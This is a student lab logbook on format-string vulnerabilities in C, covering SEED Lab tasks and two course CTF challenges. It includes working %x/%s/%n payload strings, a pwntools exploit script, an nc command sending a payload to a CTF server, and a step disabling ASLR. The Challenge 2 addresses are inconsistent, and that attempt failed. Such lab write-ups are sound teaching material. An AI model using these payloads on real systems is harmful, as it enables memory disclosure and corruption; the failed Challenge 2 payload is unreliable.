# Trabalho realizado na Semana #7 - SEED Labs - Format-String Vulnerability Lab

This week's lab topic revolves around the printf() and other similar functions in C. These functions, when not properly sanitized, can easily be used to:
- crash the program
- read the internal memory of the program
- modify the internal memory of the program
- inject and execute malicious code using the victim program’sprivilege

## Setting up

To complete these tasks, we needed to disable the adress space randomization security mechanism, to make it easier to identify the adresses of the components and so that the address of the variables stay the same in each execution of a program

```
$ sudo sysctl -w kernel.randomize_va_space=0
```

## Task 1: Crashing the Program

The task is to input to the server, such that when the server program tries to print out the user input in the myprintf() function, it will crash.

We managed to Successfully crash the program by sending the "%s" string format specifier.
Using the following command:

![Alt text](/Logbooks/img/Week7/task1_1.png)

We got the following server message: (No smiley faces == program crash)

![Alt text](/Logbooks/img/Week7/task1_2.png)

## Task 2:  Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

The goal is to print out the data on the stack. For that we will use the "%x" format specifier joined with a character sequence 'ABCD' that's easy to find when the memory is printed. (Should appear as 44434241)

Using the following command:

![Alt text](/Logbooks/img/Week7/task2A_1.png)

We got the following server message:

![Alt text](/Logbooks/img/Week7/task2A_2.png)

The stack is found after 64 characters or 256 bytes.


### Task 2.B: Heap Data

Once the initial 4-byte location of our input is identified, acquiring the secret message involves appending the address of the secret message (`\x08\x40\x0b\x08`) to the string, along with a specific number of %x instances to navigate to the precise position in the stack. Subsequently, incorporating %s ensures the printing of the value stored at that memory address, as illustrated below:

```
$ string = "\x08\x40\x0b\x08%x"*63 + "%s\n"
```

Using that string, this is the secret message obtained:

```
11223344 1000 8049db5 80e5320 80e61c0 ffff05d0 ffff04f8 80e62d4 80e5000 
ffff0598 8049f7e ffff05d0 0 64 8049f47 80e5320 518 ffff0694 ffff05d0 
80e5320 8bb3720 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 a35c6c00
80e5000 80e5000 ffff0bb8 8049eff ffff05d0 c4 5dc 80e5320 0 0 0 ffff0c84 0
0 0 c4 A secret message
```


## Task 3:  Modifying the Server Program’s Memory

The objective of this task is to modify the value of the target variable that is defined in the server program.

### Task 3.A: Change the value to a different value.

In this sub-task, we need to change the content of
the target variable to something else.

To alter the target value, we apply the identical logic used for revealing the secret message. Initially, we convert the target address to Little-Endian and employ a specific number of %x, as previously demonstrated. The key distinction is that instead of seeking to display the string using %s, the objective now is to manipulate the value by substituting %s with %n.
Like so:

```
$ string = "\x68\x50\x0e\x08%x"*63 + "%n\n"
```

Using that string on the program, we change the initial value of `target`(0x1122334) to 0x00000ee:

```
The target variable's value (before): 0x1122334
The target variable's value (after):  0x00000ee
```

### Task 3.B: Change the value to 0x5000.

In this sub-task, we need to change the content of the
target variable to a specific value 0x5000.

Having gained the ability to write to the target, our next step was to insert the appropriate number of characters into the string, ensuring that the count of characters preceding the %n value equaled 0x5000 (20480 in decimal). Upon conversion, we determined that 20480 characters were needed before the 'n' specifier.

To achieve the goal of printing 0x5000 (20480 in decimal), each %x call required a precision of 325 (20480 / 63 ~= 325) characters. This precision would result in a value just shy of 20480 (325 * 63 + 4, accounting for the initial 4 bytes of the string, equals 20479). Consequently, an additional character ('a') was inserted before the %n call to compensate for the shortfall.
With this, this was our string:

```
$ string = "\x68\x50\x0e\x08%325x"*63  + "a%n\n"
```

Using it, we obtained this:
```
The target variable's value (after):  0x00005000
```

# CTF - Control The Flag

## Challenge 1:

- What is the line of code where the vulnerability is located?
    - Line 27 in the printf(buffer) call.
- What does the vulnerability allow you to do?
    - Through the vulnerability, it is possible to crash the program, read memory, modify values, and inject malicious code.
- What is the functionality that allows you to obtain the flag?
    - Format String

1. Initially, we downloaded the provided files and verified that the attack was possible.

**main.c:**
```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG_BUFFER_SIZE 40

char flag[FLAG_BUFFER_SIZE];

void load_flag(){
    FILE *fd = fopen("flag.txt","r");

    if(fd != NULL) {
        fgets(flag, FLAG_BUFFER_SIZE, fd);
    }
}

int main() {

    load_flag();
   
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer);

    if(0) {
        printf("I like what you got!\n%s\n", flag);
    } else {
        printf("\nDisqualified!\n");
    }
    fflush(stdout);
    
    return 0;
}
```

3. By observing the contents of the stack, to carry out the attack, we inserted content into the `p.sendline()` command of the `exploit_example.py` file in order to fill the maximum capacity of the buffer in the `main()` function, which can receive input equivalent to 32 bits. Subsequently, in the same command, we consecutively added various `%x` until we realized how many were needed to reach the input.

**example_exploit.py:**
```python
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    Use pause() in this script to allow you to use gdb to attach to the process. 
    To attach to the process, you need to obtain the process ID (pid) from the output of this program. 
    (Example: Starting local process './program': pid 9717 - The pid would be 9717) 
    Then run gdb to attach. 
    (Example: `$ gdb attach 9717`)
    When attaching to the process with gdb, the program pauses at the instruction where it was running. 
    To continue the program's execution, in gdb, send the "continue" command and press enter in the exploit script.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\xaa\xaa\xaa\xaa%x%x")
p.interactive()
```

4. Running the exploit, this is the output:

![scriptRun](/Logbooks/img/Week7/scriptRun.png)

5. Successfully observing the stack, we retrieved the address of the `flag` variable by running the gdb program:

![flagAddress](/Logbooks/img/Week7/flagAddress.png)

6. Obtaining this value, since the output of our program is right at the beginning of the stack, we converted it to little endian followed by a `%s` to read the value of the previously mentioned address (the address of the `flag` variable). With this, we assigned this value as input to the function running on the server `ctf-fsi.fe.up.pt 4004`:

```
$ echo -e '\x60\xc0\x04\x08%s' | nc ctf-fsi.fe.up.pt 4004
```

7. We obtained the flag:

![flagChallenge1](/Logbooks/img/Week7/flagDesafio1.png)



## Challenge 2:

- What is the line of code where the vulnerability is located, and what does the vulnerability allow you to do?
    - Line 14 in the `printf(buffer)` command.
    - Format String - It is possible to crash the program, read from memory, alter values, and inject malicious code.
- Is the flag loaded into memory? Or is there some functionality we can use to access it?
    - We can access and alter the value of the `key` variable.
- What do you need to do to unlock this functionality?
    - Since the `Format String` vulnerability allows altering the value of variables, it is possible to change the value of `key` to be equal to **0xbeef**.

1. We ran the gdb program to discover the address of the `key` variable:

![keyAddress](/Logbooks/img/Week7/keyAddress.png)

2. Since we want the `key` variable to have the value **0xbeef**, which corresponds to **48879** in decimal, we need to print 48879 characters and then call `%n`.

3. We proceed to construct the string that will serve as the attack. We start by converting the address of the `key` variable to little endian (\x34\xc0\x04\x08\) and then add the remaining number of bytes (48879 - 4 = 48875) to reach the address of the `key` variable. Thus, we have the string `\x20\xb3\x04\x08%48875x%n`.

4. However, when we send this input to the program, when it reaches `%48875x`, the stack pointer advances to the next position and no longer points to `0x804c034` (the address of the `key` variable).

5. To try to solve this problem, we decided to add 8 bytes before the address of the `key` variable so that when the `%x` instruction is executed, the stack pointer points to the address of the `key` variable. This gives us the string `\x20\xb3\x04\x08\x20\xb3\x04\x08%48871x%n`, but when using it we ended up with no success. With this, we couldn't obtain the flag, even when trying with different possible solutions, but we think that this last mentioned try was the one that got us very close to finding the flag.
